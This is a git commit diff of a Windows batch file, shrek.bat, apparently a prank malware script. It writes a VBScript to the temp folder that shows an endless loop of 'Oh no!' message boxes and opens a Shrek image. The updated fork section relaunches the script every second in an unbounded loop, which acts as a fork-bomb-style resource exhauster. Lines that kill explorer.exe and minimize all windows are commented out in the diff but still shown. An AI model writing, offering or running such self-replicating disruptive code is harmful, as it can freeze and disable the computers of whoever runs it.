5ae395b9789f8e8fabcc981e0913cc0143cdd9d2
Neo Rafajlovic <97417002+NeoRafajlovic@users.noreply.github.com>
2026-04-11 18:33:10 -0400

    Update shrek.bat

--- shrek.bat
+++ shrek.bat
@@ -6,44 +6,47 @@ if "%1"=="" (
 )
 if "%1" NEQ "min" exit
 
-if "%2"=="setup" (
-    goto setup
-) else if "%2"=="fork" (
-    goto fork
-)
+if "%2"=="setup" goto setup
+if "%2"=="fork" goto fork
 
 :setup
 
-start "" /min powershell -command "(new-object -com shell.application).minimizeall()"
+::start "" /min powershell -command "(new-object -com shell.application).minimizeall()"
 
-taskkill /F /im explorer.exe
+::taskkill /F /im explorer.exe
 
-if exist %temp%\shrek_popup.vbs (
-	del /F /Q %temp%\shrek_popup.vbs
+if exist "%temp%\shrek_popup.vbs" (
+	del /F /Q "%temp%\shrek_popup.vbs"
 )
 
-(
-echo Set objShell = WScript.CreateObject("WScript.Shell")
-echo MsgBox "You have been shreked :("
-echo objShell.run WScript.Arguments(0) & " min fork"
-echo Do
-echo MsgBox "Oh no!"
-echo Loop
-) > "%temp%\shrek_popup.vbs"
+set "file=%temp%\shrek_popup.vbs"
 
+> "%file%" echo Set objShell = WScript.CreateObject("WScript.Shell")
+>>"%file%" echo MsgBox "You have been shreked :("
+>>"%file%" echo objShell.Run WScript.Arguments(0) ^& " min fork"
+>>"%file%" echo Do
+>>"%file%" echo MsgBox "Oh no!"
+>>"%file%" echo Loop
+
+if not exist "%temp%\shrek_popup.vbs" echo FAILED TO CREATE FILE & pause
 
 start "" /max "https://i.pinimg.com/736x/75/6b/bb/756bbb4328e246e8608500ace5d9af0d.jpg"
 
 timeout /t 1 /nobreak >nul
-start %temp%\shrek_popup.vbs %~f0
+start "" "%temp%\shrek_popup.vbs" "%~f0"
 
 exit
 
-
 :fork
+
+del /F /Q "%temp%\shrek_popup.vbs"
+
+:x
+
+timeout /t 1 /nobreak >nul
 
 start "" /min "%~f0" min fork
 
-goto fork
+goto x
 
 exit
